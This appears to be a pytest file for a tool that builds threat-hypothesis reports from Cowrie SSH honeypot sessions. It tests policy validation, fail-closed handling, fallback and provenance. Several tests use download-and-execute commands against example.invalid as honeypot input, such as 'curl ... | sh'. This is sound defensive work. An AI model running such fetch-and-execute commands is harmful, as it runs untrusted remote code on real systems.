from __future__ import annotations

import json
from copy import deepcopy
from pathlib import Path

from production.policies.threat_hypothesis_behavior_policy import (
    DEFAULT_POLICY_PATH,
    load_behavior_policy,
    policy_summary,
    resolve_behavior_policy,
    validate_behavior_policy,
)
from production.reporting.threat_hypothesis import build_v2_report


PROJECT_ROOT = Path(__file__).resolve().parents[1]
TRUSTED_POLICY_PATH = PROJECT_ROOT / DEFAULT_POLICY_PATH


def _policy() -> dict:
    return json.loads(TRUSTED_POLICY_PATH.read_text(encoding="utf-8"))


def _session_report(commands: list[str], *, policy_document: dict | None = None) -> dict:
    session_id = "behavior-policy-test"
    events = [
        {
            "session": session_id,
            "src_ip": "192.0.2.10",
            "timestamp": f"2026-07-16T00:00:{index:02d}Z",
            "eventid": "cowrie.command.input",
            "input": command,
        }
        for index, command in enumerate(commands, start=1)
    ]
    payload = {
        "session_id": session_id,
        "commands": commands,
        "classification_events": [],
        "raw_events": events,
    }
    return build_v2_report(
        {},
        [payload],
        raw_events=events,
        behavior_policy_document=policy_document,
    )


def _claim_types(report: dict) -> set[str]:
    return {
        str(claim.get("claim_type") or "")
        for claim in report["supported_assessment"]["possible_objectives"]
    }


def test_trusted_behavior_policy_is_valid_and_records_provenance() -> None:
    policy = _policy()
    assert validate_behavior_policy(policy) == []

    loaded = load_behavior_policy(str(TRUSTED_POLICY_PATH))
    summary = policy_summary(loaded)
    assert summary == {
        "schema_version": "threat_hypothesis_behavior_policy.v1",
        "policy_id": "cowrie-ssh-threat-hypothesis-behavior",
        "version": "2026-07-16",
        "enabled": True,
        "reviewed": True,
        "review_status": "approved for scoped Cowrie SSH analysis",
        "last_reviewed": "2026-07-16",
        "method": "developer-authored conservative behavior policy",
        "load_status": "loaded",
        "source": "threat_hypothesis_behavior.trusted.json",
        "fallback_used": False,
        "load_error_count": 0,
    }
    assert loaded["provenance"]["reviewed"] is True
    assert loaded["provenance"]["review_status"]


def test_policy_validator_rejects_invalid_regex_and_unsafe_claim_text() -> None:
    invalid_regex = _policy()
    invalid_regex["policy"]["extraction"]["patterns"]["url"] = "("
    assert any("invalid regex" in error for error in validate_behavior_policy(invalid_regex))

    unsafe_claim = _policy()
    unsafe_claim["policy"]["claims"]["connected"][0]["text"] = (
        "Confirmed compromise and attacker intent."
    )
    assert any(
        "unsupported high-impact claim" in error
        for error in validate_behavior_policy(unsafe_claim)
    )


def test_invalid_in_memory_policy_fails_closed_without_behavior_claims() -> None:
    policy = _policy()
    policy["policy"]["claims"]["connected"][0]["text"] = "Confirmed compromise."
    resolved = resolve_behavior_policy(policy)
    assert policy_summary(resolved)["load_status"] == "fail_closed"
    assert policy_summary(resolved)["source"] == "invalid_in_memory_policy"

    report = _session_report(
        ["curl https://example.invalid/a.sh | sh"],
        policy_document=policy,
    )
    assert report["behavior_policy"]["enabled"] is False
    assert report["observed_behavior"]["ordered_command_observations"]
    assert all(
        not observation["action_types"]
        for observation in report["observed_behavior"]["ordered_command_observations"]
    )
    assert report["supported_assessment"]["possible_objectives"] == []
    assert report["follow_on_hypothesis"]["abstained"] is True


def test_malformed_requested_file_falls_back_to_bundled_trusted_policy(tmp_path: Path) -> None:
    malformed = tmp_path / "invalid-policy.json"
    malformed.write_text("{not-json", encoding="utf-8")

    loaded = load_behavior_policy(str(malformed))
    summary = policy_summary(loaded)
    assert summary["policy_id"] == "cowrie-ssh-threat-hypothesis-behavior"
    assert summary["enabled"] is True
    assert summary["fallback_used"] is True
    assert summary["load_error_count"] >= 1


def test_disabled_policy_retains_direct_events_but_suppresses_behavior_claims() -> None:
    policy = _policy()
    policy["policy"]["enabled"] = False
    policy.pop("load_status", None)

    report = _session_report(
        ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
        policy_document=policy,
    )
    assert report["behavior_policy"]["enabled"] is False
    assert len(report["observed_behavior"]["cowrie_event_evidence"]) == 2
    assert all(
        not observation["action_types"]
        for observation in report["observed_behavior"]["ordered_command_observations"]
    )
    assert report["observed_behavior"]["connected_behavior_chains"] == []
    assert report["supported_assessment"]["possible_objectives"] == []


def test_new_remote_executable_can_be_added_without_python_changes() -> None:
    commands = [
        "fetch https://example.invalid/a.sh -o /tmp/a.sh",
        "sh /tmp/a.sh",
    ]
    default_report = _session_report(commands)
    assert "connected_transfer_execution" not in _claim_types(default_report)

    policy = _policy()
    policy["policy"]["extraction"]["remote_content_executables"]["fetch"] = {
        "output_options": ["-o"],
        "transfer_without_output": False,
        "pipe_source": False,
    }
    policy.pop("load_status", None)
    assert validate_behavior_policy(policy) == []

    report = _session_report(commands, policy_document=policy)
    assert "connected_transfer_execution" in _claim_types(report)
    observations = report["observed_behavior"]["ordered_command_observations"]
    assert observations[0]["action_types"] == ["remote_content_access", "transfer_attempt"]
    assert observations[1]["action_types"] == ["execution_attempt"]
    assert {
        relationship["relationship_type"]
        for relationship in report["observed_behavior"]["behavior_relationships"]
    } >= {"artifact_execution"}
    assert report["behavior_policy"]["load_status"] == "provided"


def test_connected_claim_precedence_can_be_extended_without_python_changes() -> None:
    policy = deepcopy(_policy())
    policy["policy"]["claims"]["connected"].insert(0, {
        "rule_id": "reviewed-transfer-execution-test-rule",
        "required_action_types": ["transfer_attempt", "execution_attempt"],
        "excluded_action_types": [],
        "claim_type": "reviewed_transfer_execution_observation",
        "text": "A reviewed test rule observed linked transfer and execution attempts for one path.",
        "evidence_status_override": "partially_supported",
        "limitations": ["This test rule does not establish successful execution."],
    })
    policy.pop("load_status", None)
    assert validate_behavior_policy(policy) == []

    report = _session_report(
        ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
        policy_document=policy,
    )
    claim = report["supported_assessment"]["connected_behavior_claims"][0]
    assert claim["claim_type"] == "reviewed_transfer_execution_observation"
    assert claim["behavior_policy_rule_id"] == "reviewed-transfer-execution-test-rule"
    assert claim["evidence_status"] == "partially_supported"


def test_policy_provenance_is_exposed_across_canonical_sections() -> None:
    report = _session_report(["curl https://example.invalid/a.sh -o /tmp/a.sh"])
    expected = report["behavior_policy"]
    assert expected["policy_id"] == "cowrie-ssh-threat-hypothesis-behavior"
    assert report["observed_behavior"]["behavior_policy"] == expected
    assert report["supported_assessment"]["behavior_policy"] == expected
    assert report["follow_on_hypothesis"]["behavior_policy"] == expected
